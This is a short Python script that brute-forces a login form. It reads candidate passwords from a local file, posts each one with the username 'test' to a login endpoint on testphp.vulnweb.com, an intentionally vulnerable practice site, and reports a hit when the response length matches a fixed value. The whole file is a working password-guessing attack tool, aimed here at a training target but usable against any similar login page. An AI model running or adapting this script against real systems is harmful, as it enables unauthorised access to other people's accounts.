import requests

def send_request(password):
    username = "test"
    target_url = 'http://testphp.vulnweb.com/userinfo.php'
    data = {'uname': 'test', 'pass': password}
    response = requests.post(target_url,data=data)
    # print(response.status_code)
    # print(len(response.text))
    if(len(response.text) == 5963):
        print("Bingo....\nUsername: %s Password: %s Response: %s" % (username, password, len(response.text)))
        final_result = password
    else:
        print("Attack Initiated...... Checking Diffrent Combinations.......")

def read_password_file():
    file = 'passwords.txt'
    with open(file, 'r') as passwords:
        for password in passwords.readlines():
            send_request(password.replace("\n", ""))
            
def main():
    read_password_file()

main()
            